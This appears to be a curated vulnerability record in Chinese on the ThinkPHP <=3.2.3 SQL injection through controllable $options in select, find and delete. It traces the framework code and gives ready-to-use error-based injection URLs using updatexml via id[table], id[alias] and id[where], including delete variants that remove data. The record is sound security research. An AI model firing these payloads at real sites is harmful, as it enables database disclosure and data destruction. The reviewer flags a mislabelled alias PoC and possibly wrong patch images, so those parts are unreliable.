---
source: "hatch 补库批 20260928"
product: "ThinkPHP / select-find-delete options 注入"
record_type: "analysis"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "Thinkphp 3.2.3 select&find&delete 注入漏洞"
prerequisites: "来源所述条件，未列明部分仍待核：<=3.2.3粗范围；应用传入可控数组为options，复合主键/where非空条件有分析"
side_effects: "未执行；本文需注意的操作影响：三张补丁图引用另一漏洞；delete/select/find分别引用Thinkphp3.1.3sql目录rId25/26/27，内容可能串图，应视检；delete alias PoC贴成where；标alias的URL实际只有id[where]，与上一项重复，缺真正别名变体；delete副作用需突出；注入端点自身执行删除，应只在隔离数据集验证"
source_status: "unknown"
id: "vw-222825c111b6da612a4de126"
entity_id: "ve-222825c111b6da612a4de126"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：&lt;=3.2.3粗范围；应用传入可控数组为options，复合主键/where非空条件有分析

代码与实验材料：完整parseOptions/parseTable/parseWhere/delete摘录与三个入口变体；未运行

来源证据范围：有先知2629，修复commit只有截图

- **操作与副作用边界（1）**：三张补丁图引用另一漏洞；依据：delete/select/find分别引用Thinkphp3.1.3sql目录rId25/26/27，内容可能串图，应视检。保留原步骤及请求方法。执行条件包括隔离且获授权的可恢复环境、预先记录相关文件/账号/配置/业务记录状态；响应完成不能等同无副作用，恢复时须核对该操作涉及的实际对象。

- **操作与副作用边界（2）**：delete alias PoC贴成where；依据：标alias的URL实际只有id\[where\]，与上一项重复，缺真正别名变体。保留原步骤及请求方法。执行条件包括隔离且获授权的可恢复环境、预先记录相关文件/账号/配置/业务记录状态；响应完成不能等同无副作用，恢复时须核对该操作涉及的实际对象。

- **事实待核（3）**：应用入口及修复范围不完整；依据：没有test控制器/模型创建、确切patch版本；“目测having/group可行”未经复现应保留推测标签。该项尚不能从转载本身确定外部事实；下文相应编号、版本或修复说法只作为来源记录，不能据此判定部署受影响或已修复。明确更正另列于本节。

- **操作与副作用边界（4）**：delete副作用需突出；依据：注入端点自身执行删除，应只在隔离数据集验证。保留原步骤及请求方法。执行条件包括隔离且获授权的可恢复环境、预先记录相关文件/账号/配置/业务记录状态；响应完成不能等同无副作用，恢复时须核对该操作涉及的实际对象。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# Thinkphp 3.2.3 select&find&delete 注入漏洞

一、漏洞简介
------------

二、漏洞影响
------------

\<= 3.2.3

三、复现过程
------------

### 漏洞分析

通过github上的commit
对比其实可以粗略知道，此次更新主要是在`ThinkPHP/Library/Think/Model.class.php`文件中，其中对于`delete`，`find`，`select`三个函数进行了修改。

`delete`函数

![](./.resource/Thinkphp3.1.3sql注入漏洞/media/rId25.png)

`select`函数

![](./.resource/Thinkphp3.1.3sql注入漏洞/media/rId26.png)

`find`函数

![](./.resource/Thinkphp3.1.3sql注入漏洞/media/rId27.png)

对比三个方法修改的地方都有一个共同点：

> 把外部传进来的`$options`，修改为`$this->options`，同时不再使用`$this->_parseOptions`对于`$options`进行表达式分析。

思考是因为`$options`可控，再经过`_parseOptions`函数之后产生了sql注入。

### 一 select 和 find 函数

以`find`函数为例进行分析（`select`代码类似），该函数可接受一个`$options`参数，作为查询数据的条件。

当`$options`为数字或者字符串类型的时候，直接指定当前查询表的主键作为查询字段：

    if (is_numeric($options) || is_string($options)) {
                $where[$this->getPk()] = $options;
                $options               = array();
                $options['where']      = $where;
    }

同时提供了对复合主键的查询，看到判断：

    if (is_array($options) && (count($options) > 0) && is_array($pk)) {
                // 根据复合主键查询
                ......
            }

要进入复合主键查询代码，需要满足`$options`为数组同时`$pk`主键也要为数组，但这个对于表只设置一个主键的时候不成立。

那么就可以使`$options`为数组，同时找到一个表只有一个主键，就可以绕过两次判断，直接进入`_parseOptions`进行解析。

    if (is_numeric($options) || is_string($options)) {//$options为数组不进入
                $where[$this->getPk()] = $options;
                $options               = array();
                $options['where']      = $where;
            }
            // 根据复合主键查找记录
            $pk = $this->getPk();
            if (is_array($options) && (count($options) > 0) && is_array($pk)) { //$pk不为数组不进入
                ......
            }
            // 总是查找一条记录
            $options['limit'] = 1;
            // 分析表达式
            $options = $this->_parseOptions($options); //解析表达式
            // 判断查询缓存
            .....
            $resultSet = $this->db->select($options); //底层执行

之后跟进`_parseOptions`方法，（分析见代码注释）

    if (is_array($options)) { //当$options为数组的时候与$this->options数组进行整合
                $options = array_merge($this->options, $options);
            }

            if (!isset($options['table'])) {//判断是否设置了table 没设置进这里
                // 自动获取表名
                $options['table'] = $this->getTableName();
                $fields           = $this->fields;
            } else {
                // 指定数据表 则重新获取字段列表 但不支持类型检测
                $fields = $this->getDbFields(); //设置了进这里
            }

            // 数据表别名
            if (!empty($options['alias'])) {//判断是否设置了数据表别名
                $options['table'] .= ' ' . $options['alias']; //注意这里，直接拼接了
            }
            // 记录操作的模型名称
            $options['model'] = $this->name;

            // 字段类型验证
            if (isset($options['where']) && is_array($options['where']) && !empty($fields) && !isset($options['join'])) { //让$optison['where']不为数组或没有设置不进这里
                // 对数组查询条件进行字段类型检查
               ......
            }
            // 查询过后清空sql表达式组装 避免影响下次查询
            $this->options = array();
            // 表达式过滤
            $this->_options_filter($options);
            return $options;

`$options`我们可控，那么就可以控制为数组类型，传入`$options['table']`或`$options['alias']`等等，只要提层不进行过滤都是可行的。

同时我们可以不设置`$options['where']`或者设置`$options['where']`的值为字符串，可绕过字段类型的验证。

可以看到在整个对`$options`的解析中没有过滤，直接返回，跟进到底层`ThinkPHP\Libray\Think\Db\Diver.class.php`，找到`select`方法，继续跟进最后来到`parseSql`方法，对`$options`的值进行替换，解析。

因为`$options['table']`或`$options['alias']`都是由`parseTable`函数进行解析，跟进：

    if (is_array($tables)) {//为数组进
                // 支持别名定义
              ......
            } elseif (is_string($tables)) {//不为数组进
                $tables = array_map(array($this, 'parseKey'), explode(',', $tables));
            }
            return implode(',', $tables);

当我们传入的值不为数组，直接进行解析返回带进查询，没有任何过滤。

同时`$options['where']`也一样，看到`parseWhere`函数

    $whereStr = '';
            if (is_string($where)) {
                // 直接使用字符串条件
                $whereStr = $where; //直接返回了，没有任何过滤
            } else {
                // 使用数组表达式
               ......
            }
            return empty($whereStr) ? '' : ' WHERE ' . $whereStr;

### 二 delete函数

`delete`函数有些不同，主要是在解析完`$options`之后，还对`$options['where']`判断了一下是否为空，需要我们传一下值，使之不为空,从而继续执行删除操作。

    ......
            // 分析表达式
            $options = $this->_parseOptions($options);
            if (empty($options['where'])) { //注意这里，还判断了一下$options['where']是否为空，为空直接返回，不再执行下面的代码。
                // 如果条件为空 不进行删除操作 除非设置 1=1
                return false;
            }
            if (is_array($options['where']) && isset($options['where'][$pk])) {
                $pkValue = $options['where'][$pk];
            }

            if (false === $this->_before_delete($options)) {
                return false;
            }
            $result = $this->db->delete($options);
            if (false !== $result && is_numeric($result)) {
                $data = array();
                if (isset($pkValue)) {
                    $data[$pk] = $pkValue;
                }

                $this->_after_delete($data, $options);
            }
            // 返回删除记录个数
            return $result;

### 漏洞复现

针对`select()` 和`find()`方法
,有很多地方可注，这里主要列举三个`table`，`alias`，`where`，更多还请自行跟踪一下`parseSql`的各个`parseXXX`方法，目测都是可行的，比如`having`,`group`等。

    table：http://www.0-sec.org/index.php?m=Home&c=Index&a=test&id[table]=user where%201%20and%20updatexml(1,concat(0x7e,user(),0x7e),1)--

    alias：http://www.0-sec.org/index.php?m=Home&c=Index&a=test&id[alias]=where%201%20and%20updatexml(1,concat(0x7e,user(),0x7e),1)--

    where: http://www.0-sec.org/index.php?m=Home&c=Index&a=test&id[where]=1%20and%20updatexml(1,concat(0x7e,user(),0x7e),1)--

![](./.resource/Thinkphp3.2.3select&find&delete注入漏洞/media/rId31.png)

而`delete()`方法的话同样，这里粗略举三个例子，`table`,`alias`,`where`，但使用`table`和`alias`的时候，同时还必须保证`where`不为空（详细原因后面会说）

    where: http://www.0-sec.org/index.php?m=Home&c=Index&a=test&id[where]=1%20and%20updatexml(1,concat(0x7e,user(),0x7e),1)--

    alias: http://www.0-sec.org/index.php?m=Home&c=Index&a=test&id[where]=1%20and%20updatexml(1,concat(0x7e,user(),0x7e),1)--

    table: http://www.0-sec.org/index.php?m=Home&c=Index&a=test&id[table]=user%20where%201%20and%20updatexml(1,concat(0x7e,user(),0x7e),1)--&id[where]=1

![](./.resource/Thinkphp3.2.3select&find&delete注入漏洞/media/rId32.png)

参考链接
--------

> <https://xz.aliyun.com/t/2629#toc-1>
